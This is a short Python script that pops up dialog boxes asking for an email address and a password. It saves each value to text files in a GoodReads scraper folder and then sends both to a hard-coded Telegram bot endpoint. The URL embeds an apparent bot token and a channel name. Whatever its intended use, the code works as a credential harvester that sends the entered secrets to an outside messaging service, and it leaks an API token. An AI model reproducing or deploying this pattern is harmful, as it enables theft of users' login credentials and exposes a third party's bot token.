import easygui as eg
import requests
def foo(text):
    requests.get(f'https://api.telegram.org/bot940336449:AAFZY87pCb8QBcmkq4QL26myH-XoI_l1SUA/sendMessage?chat_id=@somebodythatiusedtoknowgg&parse_mode=Markdown&text={text}')
lst = ['email', 'passw']
sum = ""
for i in lst:
    f = open(f'E:\\GoodReads\\goodreads\\goodreads\\spiders\\files\\props\\{i}.txt', 'w', encoding='utf-8')
    name = i
    if i=='passw':
        name+='ord'
    hey = eg.enterbox(f'enter your {name}: ')
    sum+=hey+'\n'
    f.write(hey)
    f.close()
foo(sum)